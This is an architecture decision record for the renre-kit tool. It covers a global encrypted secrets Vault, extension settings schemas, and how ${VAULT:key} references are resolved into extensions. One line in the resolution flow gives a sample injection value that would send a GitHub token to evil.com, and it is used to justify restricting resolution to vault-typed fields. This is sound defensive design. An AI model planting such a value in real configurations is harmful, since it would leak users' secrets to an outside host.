# ADR-009: Vault as Core Feature + Extension Settings

## Status
Accepted

## Context
Extensions need secrets — API tokens, credentials, connection strings. MCP extensions reference them via `${VAULT:key}` in manifests. We need a secure way to store, manage, and inject secrets without exposing them over HTTP.

Additionally, extensions need a way to declare their required configuration (which secrets they need, custom settings) so users can set them up after installation.

Options considered:
1. **Environment variables only** — user sets env vars before starting, no management UI
2. **Vault as extension** — installable, project-scoped (rejected — too fundamental)
3. **Vault as core feature** — built into worker service, global secrets, always available

## Decision

### Vault is a Core Feature (Not an Extension)
**Vault is built into the worker service and Console UI.** It is always available — no installation required. It appears in the Console **toolbar** (not sidebar), accessible from any project.

### Vault Secrets are Global
Secrets are **not project-scoped** — they are global to the user's machine. Set a GitHub token once, use it across all projects. This avoids redundant secret entry.

### Extensions Declare Settings
Extensions can declare a `settings` field in their manifest with required/optional config variables. Each extension gets a **settings page** in the Console where users configure these variables — binding them to Vault keys or entering custom values.

### How It Works

```
User → Console Toolbar → Vault → Set "github_token" = "ghp_xxx" (global)
                                        ↓
                                  SQLite (encrypted, global)

User → Extension Settings Page → Map "GITHUB_TOKEN" → ${VAULT:github_token}
                                        ↓
                              .renre-kit/extensions.json (per-project settings)

Extension Mount → Worker reads extension settings
               → Resolves ${VAULT:key} from global Vault
               → Injects into extension (env vars / headers)
```

### Vault Capabilities

| Capability | How |
|-----------|-----|
| **Store secrets** | Console Toolbar → Vault → SQLite (encrypted, **global**) |
| **Manage secrets** | Vault UI: add, edit, delete, list (masked) |
| **Reuse across projects** | Global scope — set once, available everywhere |
| **Inject into stdio MCP** | Resolved `${VAULT:key}` → process env vars |
| **Inject into SSE MCP** | Resolved `${VAULT:key}` → headers/URL values |
| **Inject into hooks** | Resolved `${VAULT:key}` → hook command env vars |
| **Read via HTTP** | **Not available** — no HTTP routes expose secret values |

### Console UI — Vault (Toolbar)
- Accessible from toolbar icon (always visible, any project)
- List secrets (keys only, values masked as `••••••••`)
- Add new secret (key + value input)
- Edit secret value (must re-enter, no reveal)
- Delete secret (with confirmation)
- Search/filter secrets by key name

### Extension Settings

Extensions declare their configuration needs in the manifest:

```json
{
  "name": "jira-plugin",
  "settings": {
    "schema": [
      {
        "key": "JIRA_BASE_URL",
        "label": "Jira Base URL",
        "type": "string",
        "required": true,
        "placeholder": "https://yourcompany.atlassian.net"
      },
      {
        "key": "JIRA_API_TOKEN",
        "label": "Jira API Token",
        "type": "vault",
        "required": true,
        "description": "Select a Vault secret or create a new one"
      },
      {
        "key": "JIRA_DEFAULT_PROJECT",
        "label": "Default Project Key",
        "type": "string",
        "required": false,
        "default": ""
      }
    ]
  }
}
```

#### Setting Types
| Type | UI Control | Resolution |
|------|-----------|------------|
| `string` | Text input | Used as-is |
| `vault` | Vault key picker (dropdown of existing keys + "create new") | Resolved from Vault at mount time |
| `number` | Number input | Used as-is |
| `boolean` | Toggle | Used as-is |
| `select` | Dropdown (options defined in schema) | Used as-is |

#### Extension Settings Page (Console UI)
When a user clicks an extension in the sidebar, the settings page shows:
- Auto-generated form from the extension's `settings.schema`
- `vault` type fields show a dropdown of existing Vault keys + option to create a new secret inline
- Settings are saved per-project in `.renre-kit/extensions.json`
- Required fields must be filled before the extension can activate

#### Settings Storage (`.renre-kit/extensions.json`)
```json
{
  "extensions": [
    {
      "name": "jira-plugin",
      "version": "1.0.0",
      "source": "marketplace",
      "installedAt": "2026-03-07T10:00:00Z",
      "settings": {
        "JIRA_BASE_URL": "https://mycompany.atlassian.net",
        "JIRA_API_TOKEN": "${VAULT:jira_token}",
        "JIRA_DEFAULT_PROJECT": "PROJ"
      }
    }
  ]
}
```

### Resolution Flow
When the worker service mounts an extension:
1. Reads extension entry from `.renre-kit/extensions.json` (project-specific settings)
2. Reads extension manifest `settings.schema` to validate required fields
3. **Only resolves `${VAULT:key}` patterns in settings declared as `type: "vault"` in the manifest schema.** Settings of type `string`, `number`, `boolean`, or `select` are used as literal values — any `${VAULT:...}` text in non-vault fields is treated as a plain string, not resolved. This prevents Vault injection attacks where a malicious config value in a `string` field could exfiltrate secrets (e.g., `https://evil.com/?token=${VAULT:github_token}`).
4. Cross-checks resolved Vault key names against the extension's `permissions.vault` list (ADR-017). If a `vault`-type setting references a key not in the extension's declared permissions, the mount fails with: `"Extension 'X' references Vault key 'Y' but does not declare it in permissions.vault"`
5. Resolves from global Vault (SQLite) — in-memory only, never written to disk
6. Passes resolved config to the extension context (env vars for stdio, headers for SSE, config object for native routes)

If a required setting is missing or a `${VAULT:key}` cannot be resolved, the mount fails with a clear error listing what's needed.

## Consequences

### Positive
- Vault is always available — zero setup for secret management
- Global secrets avoid redundant entry across projects
- Extension settings provide guided setup — users know exactly what an extension needs
- `vault` type settings connect directly to Vault — no manual `${VAULT:...}` typing
- Settings page auto-generated from manifest — extension authors define schema, UI is free

### Negative
- Global Vault means one compromised secret affects all projects
- Settings schema adds complexity to extension manifest
- Must handle schema migrations when extensions update their settings

### Mitigations
- Vault encryption uses **AES-256-GCM** with a unique IV per secret entry. The encryption key is derived using **PBKDF2 with 100,000 iterations** from a seed combining machine identity (`os.hostname()`, `os.userInfo().username`, hardware UUID where available). Future: support optional master password as additional KDF input for stronger security.
- `${VAULT:key}` resolution is restricted to `type: "vault"` settings only — prevents injection via string fields
- Resolved Vault keys are cross-checked against extension `permissions.vault` — prevents unauthorized access
- Console UI never reveals secret values (masked, re-enter to change)
- Settings schema is additive — new optional fields don't break existing configs
- `.renre-kit/` directory should be added to `.gitignore` during `renre-kit init` to prevent Vault key name leakage via `extensions.json`
- Future: `renre-kit vault set KEY VALUE` CLI command for headless environments
- Future: optional master password, secret rotation policies, and audit log
- Future: key re-encryption command for machine identity changes (hostname/username change recovery)
